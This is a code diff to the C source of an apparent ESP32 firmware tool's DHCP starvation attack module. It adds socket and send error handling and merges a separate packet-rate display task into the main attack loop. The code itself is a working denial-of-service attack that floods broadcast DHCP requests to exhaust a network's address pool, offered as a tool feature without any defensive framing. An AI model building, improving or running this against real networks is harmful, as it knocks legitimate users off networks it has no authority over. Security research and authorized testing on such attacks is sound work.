@@ -23,6 +23,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h>
 
 // External globals from wifi_manager.c
 extern EventGroupHandle_t wifi_event_group;
@@ -31,7 +32,6 @@ extern EventGroupHandle_t wifi_event_group;
 static volatile bool dhcp_starve_running = false;
 static volatile uint32_t dhcp_starve_packets_sent = 0;
 static TaskHandle_t dhcp_starve_task_handle = NULL;
-static TaskHandle_t dhcp_starve_display_task_handle = NULL;
 
 // DHCP packet structure
 #pragma pack(push,1)
@@ -50,9 +50,26 @@ typedef struct {
 // DHCP starvation task
 static void dhcp_starve_task(void *param) {
     (void)param;
+    TickType_t last_log_tick = xTaskGetTickCount();
+    uint32_t last_log_total = 0;
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) {
+        glog("DHCP-Starve: failed to create socket\n");
+        dhcp_starve_running = false;
+        dhcp_starve_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
     int broadcast = 1;
-    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
+    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) != 0) {
+        glog("DHCP-Starve: failed to configure broadcast socket\n");
+        close(sock);
+        dhcp_starve_running = false;
+        dhcp_starve_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
     struct sockaddr_in addr = { 
         .sin_family = AF_INET, 
         .sin_port = htons(67), 
@@ -78,28 +95,28 @@ static void dhcp_starve_task(void *param) {
         pkt.options[5] = 1; 
         pkt.options[6] = 1; 
         pkt.options[7] = 255;
-        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
+        ssize_t sent = sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
+        if (sent < 0) {
+            glog("DHCP-Starve: send failed, stopping attack\n");
+            dhcp_starve_running = false;
+            break;
+        }
         dhcp_starve_packets_sent++;
+
+        TickType_t now = xTaskGetTickCount();
+        if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
+            uint32_t total = dhcp_starve_packets_sent;
+            uint32_t interval = total - last_log_total;
+            last_log_total = total;
+            last_log_tick = now;
+            uint32_t pps = interval / 5;
+            glog("DHCP-Starve: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
+        }
+
         vTaskDelay(pdMS_TO_TICKS(10));
     }
     close(sock);
     dhcp_starve_task_handle = NULL;
-    vTaskDelete(NULL);
-}
-
-// Display task for periodic stats
-static void dhcp_starve_display_task(void *param) {
-    (void)param;
-    uint32_t prev_total = 0;
-    while (dhcp_starve_running) {
-        vTaskDelay(pdMS_TO_TICKS(5000));
-        uint32_t total = dhcp_starve_packets_sent;
-        uint32_t interval = total - prev_total;
-        prev_total = total;
-        uint32_t pps = interval / 5;
-        glog("DHCP-Starve: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
-    }
-    dhcp_starve_display_task_handle = NULL;
     vTaskDelete(NULL);
 }
 
@@ -125,8 +142,16 @@ void dhcp_starvation_start(int threads) {
     // Note: threads parameter is currently ignored - single thread implementation
     (void)threads;
     
-    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
-    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 4096, NULL, 5, &dhcp_starve_display_task_handle);
+    BaseType_t attack_rc = xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
+    if (attack_rc != pdPASS) {
+        glog("Failed to start DHCP starvation task (%ld)\n", (long)attack_rc);
+        dhcp_starve_running = false;
+        if (dhcp_starve_task_handle != NULL) {
+            vTaskDelete(dhcp_starve_task_handle);
+            dhcp_starve_task_handle = NULL;
+        }
+        return;
+    }
     
 #ifdef CONFIG_WITH_STATUS_DISPLAY
     status_display_show_status("DHCP Starve");
@@ -142,7 +167,7 @@ void dhcp_starvation_stop(void) {
     
     // Wait for tasks to delete themselves (max 2 seconds)
     int wait_count = 0;
-    while ((dhcp_starve_task_handle != NULL || dhcp_starve_display_task_handle != NULL) && wait_count < 20) {
+    while (dhcp_starve_task_handle != NULL && wait_count < 20) {
         vTaskDelay(pdMS_TO_TICKS(100));
         wait_count++;
     }
